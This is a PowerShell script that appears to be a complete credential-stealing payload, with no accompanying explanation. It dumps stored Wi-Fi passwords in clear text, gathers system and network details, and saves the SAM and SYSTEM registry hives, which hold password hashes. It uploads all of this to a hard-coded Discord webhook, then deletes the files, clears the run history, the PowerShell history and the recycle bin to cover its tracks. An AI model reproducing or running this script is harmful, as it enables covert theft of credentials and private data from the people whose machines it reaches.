
cd $env:SystemRoot\System32\Microsoft_OneDrive\BQ
Function Get-Networks {
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress
$WLANProfileNames =@()
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "
Foreach($WLANProfileName in $Output){
  $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects =@()
Foreach($WLANProfileName in $WLANProfileNames){
try{
      $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
  }Catch{
    $WLANProfilePassword = "The password is not stored in this profile"
}
$WLANProfileObject = New-Object PSCustomobject
$WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
$WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
$WLANProfileObjects += $WLANProfileObject
Remove-Variable WLANProfileObject
}
return $WLANProfileObjects
}
$Networks = Get-Networks

function Get-fullName {

    try {

    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")

    }
 
 
    catch {Write-Error "No name was detected" 
    return $env:UserName
    -ErrorAction SilentlyContinue
    }

    return $fullName 

}
$FN = Get-fullName
$FN | Out-file ./user.txt
Get-Networks | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\WIFI-INFO.txt
ipconfig /all | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt
net user | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt
arp -a | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\arp.txt
systeminfo | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\systeminfo.txt
getmac /v | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\mac.txt
netstat -aon | Out-File -FilePath $env:SystemRoot\System32\Microsoft_OneDrive\BQ\netstat.txt
reg save HKLM\sam ./sam.save
reg save HKLM\system ./system.save



function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discord.com/api/webhooks/1184838069740896326/B30LAh5X9NkQ111endVELXK2MBQRblzduqnE2tcSjRhPXn3dEnLCrUp-5hjj6mVGIYEk'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\user.txt
Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\WIFI-INFO.txt
Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt
Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt
Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\arp.txt
Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\systeminfo.txt
Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\mac.txt
Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\netstat.txt
Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save
Upload-Discord -file $env:SystemRoot\System32\Microsoft_OneDrive\BQ\system.save
rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\user.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\WIFI-INFO.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\ipconfig.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\users.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\arp.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\systeminfo.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\mac.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\netstat.txt" -r -Force -ErrorAction SilentlyContinue
rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\sam.save" -r -Force -ErrorAction SilentlyContinue
rm "$env:SystemRoot\System32\Microsoft_OneDrive\BQ\system.save" -r -Force -ErrorAction SilentlyContinue


function Clean-Exfil { 

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}
Clean-Exfil
Remove-Item (Get-PSreadlineOption).HistorySavePath
cls
exit




